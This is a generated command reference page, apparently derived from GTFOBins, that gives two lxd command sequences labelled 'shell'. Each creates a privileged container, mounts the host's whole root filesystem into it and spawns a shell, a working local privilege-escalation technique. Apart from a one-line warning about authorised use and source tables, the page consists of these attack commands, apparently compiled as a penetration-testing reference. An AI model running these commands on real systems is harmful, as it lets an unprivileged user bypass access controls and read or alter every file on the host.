---
parsed_by: focuslocust
source: commands
type: generated
---
# lxd Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## lxd

Tool page: [lxd](../../tools/linux/lxd.md)

### shell

```text
lxc init ubuntu:16.04 x -c security.privileged=true
lxc config device add x x disk source=/ path=/mnt/ recursive=true
lxc start x
lxc exec x /bin/sh
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/lxd` |
| Evidence | Function example preserved from source parser. |

### shell

```text
lxc image import ./alpine*.tar.gz --alias x
lxc init x x -c security.privileged=true
lxc config device add x x disk source=/ path=/mnt/ recursive=true
lxc start x
lxc exec x /bin/sh
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/lxd` |
| Evidence | Function example preserved from source parser. |
